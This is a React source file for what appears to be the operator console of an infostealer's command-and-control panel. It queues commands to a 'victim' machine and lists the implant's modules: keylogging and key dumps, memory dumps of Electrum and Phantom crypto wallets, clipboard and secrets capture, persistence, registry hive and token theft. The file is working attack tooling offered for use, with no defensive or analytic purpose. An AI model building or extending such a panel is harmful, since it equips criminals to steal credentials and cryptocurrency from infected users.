'use client';
import { useEffect, useRef, useState } from 'react';
import { ChevronRight, Terminal } from 'lucide-react';
import { toast } from 'sonner';
import { useApi, mutate } from '@/hooks/useApi';
import { useLiveContext } from '@/components/live-provider';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Empty, SkeletonRows } from '@/components/ui/table';
import { Badge } from '@/components/ui/badge';
import type { Task } from '@/lib/types';
import { dateTime } from '@/lib/format';

const COMMANDS = [
  'help', 'ops', 'status', 'ping', 'ls', 'keys status', 'keys on', 'keys off --hard', 'keys dump',
  'memdump electrum', 'memdump phantom', 'wallet watch status', 'wallet watch on', 'wallet watch off',
  'clip status', 'clip on', 'clip off', 'clip secrets on', 'clip secrets off',
  'persist on', 'persist off', 'bootstrap', 'hives', 'update status', 'update check', 'update auto status',
  'gateway status', 'gateway restart', 'token', 'clear 100', 'sleep 60'
];

/** Agent console. Separate from the OS shell: these are agent module commands. */
export function AgentConsole({ victimId }: { victimId: string }) {
  const [command, setCommand] = useState('');
  const [history, setHistory] = useState<string[]>([]);
  const [cursor, setCursor] = useState(-1);
  const [busy, setBusy] = useState(false);
  const input = useRef<HTMLInputElement>(null);
  const { data, loading, refresh } = useApi<{ items: Task[] }>(`/tasks?victim=${victimId}&name=agent&limit=50`, { pollMs: 4000 });
  const live = useLiveContext();
  const last = live.events[0];

  useEffect(() => {
    const saved = localStorage.getItem('spc.agent.history');
    if (saved) {
      try { setHistory(JSON.parse(saved)); } catch { /* ignore */ }
    }
  }, []);
  useEffect(() => {
    if (last?.type === 'task.update') refresh();
  }, [last?.at]); // eslint-disable-line react-hooks/exhaustive-deps

  function remember(value: string) {
    const next = [value, ...history.filter((item) => item !== value)].slice(0, 100);
    setHistory(next);
    localStorage.setItem('spc.agent.history', JSON.stringify(next));
  }

  async function run(event: React.FormEvent) {
    event.preventDefault();
    const value = command.trim();
    if (!value || busy) return;
    const top = value.split(' ')[0]!.toLowerCase();
    if (!COMMANDS.some((item) => item.split(' ')[0] === top)) {
      toast.error(`unknown agent command: ${top}`);
      return;
    }
    setBusy(true);
    try {
      await mutate('/tasks', 'POST', {
        victim_ids: [victimId],
        name: 'agent',
        params: { command: value },
        timeout_sec: 60
      });
      remember(value);
      setCommand('');
      setCursor(-1);
      refresh();
    } catch (caught) {
      toast.error(caught instanceof Error ? caught.message : 'command failed');
    } finally {
      setBusy(false);
    }
  }

  function key(event: React.KeyboardEvent<HTMLInputElement>) {
    if (event.key === 'ArrowUp') {
      event.preventDefault();
      const next = Math.min(history.length - 1, cursor + 1);
      if (next >= 0) { setCursor(next); setCommand(history[next]!); }
    } else if (event.key === 'ArrowDown') {
      event.preventDefault();
      const next = cursor - 1;
      setCursor(next);
      setCommand(next >= 0 ? history[next]! : '');
    } else if (event.key === 'Tab') {
      event.preventDefault();
      const match = COMMANDS.find((item) => item.startsWith(command));
      if (match) setCommand(match);
    }
  }

  return (
    <div className="flex h-[520px] flex-col">
      <div className="flex-1 overflow-y-auto bg-black/40 p-3 font-mono text-xs">
        {loading ? <SkeletonRows rows={6} cols={2} /> : (data?.items ?? []).length === 0 ? (
          <Empty title="No agent commands yet" hint="Try ops, help or status. ↑/↓ history, Tab completes." />
        ) : (
          data!.items.slice().reverse().map((task) => (
            <div key={task.id} className="mb-2">
              <p className="text-muted">$ {String(task.params.command)}
                <span className="ml-2 text-2xs text-muted/60">{dateTime(task.createdAt)} · {task.status}</span>
              </p>
              <pre className="whitespace-pre-wrap break-all text-ink/90">
                {['error', 'unknown', 'cancelled', 'expired'].includes(task.status)
                  ? task.error ?? task.status
                  : task.result ? String((task.result as { output?: string }).output ?? JSON.stringify(task.result)) : (task.status === 'queued' ? 'queued…' : task.status)}
              </pre>
            </div>
          ))
        )}
      </div>
      <form onSubmit={run} className="flex items-center gap-2 border-t border-line p-2">
        <ChevronRight className="h-3.5 w-3.5 text-brand" />
        <Input
          ref={input}
          value={command}
          onChange={(event) => setCommand(event.target.value)}
          onKeyDown={key}
          list="spc-agent-commands"
          placeholder="ops · keys status · update check"
          className="h-8 border-0 bg-transparent font-mono focus-visible:ring-0"
        />
        <datalist id="spc-agent-commands">{COMMANDS.map((item) => <option key={item} value={item} />)}</datalist>
        <Badge tone={busy ? 'warn' : 'default'}><Terminal className="h-2.5 w-2.5" />{busy ? 'sending' : 'agent'}</Badge>
        <Button size="sm" loading={busy} disabled={busy || !command.trim()}>run</Button>
      </form>
    </div>
  );
}
